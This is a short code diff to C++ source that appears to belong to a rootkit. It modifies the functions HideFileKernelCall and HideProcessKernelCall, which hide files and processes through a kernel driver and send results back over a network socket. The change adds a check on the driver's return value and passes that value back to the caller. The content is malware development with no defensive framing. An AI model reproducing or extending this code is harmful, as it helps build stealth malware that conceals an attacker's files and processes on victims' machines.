@@ -535,13 +535,13 @@ int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNam
 
 
 	// Parse returned data correctly (after sending back main struct):
-	if (RequestStatus == SHOWHIDDEN_FILEFOLDER && RootkInst->Size != 0) {
+	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_FILEFOLDER && RootkInst->Size != 0) {
 		result = root_internet::SendData(tosock, RootkInst->Out, (int)RootkInst->Size, FALSE, 0);
 		if (result.err || result.value != RootkInst->Size) {
 			return 0;
 		}
 	}
-	return 1;
+	return DriverRes;
 }
 
 
@@ -590,11 +590,11 @@ int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* Module
 
 
 	// Parse returned data correctly (after sending back main struct):
-	if (RequestStatus == SHOWHIDDEN_PROCESS && RootkInst->Size != 0) {
+	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_PROCESS && RootkInst->Size != 0) {
 		result = root_internet::SendData(tosock, RootkInst->Out, RootkInst->Size, FALSE, 0);
 		if (result.err || result.value != RootkInst->Size) {
 			return 0;
 		}
 	}
-	return 1;
+	return DriverRes;
 }
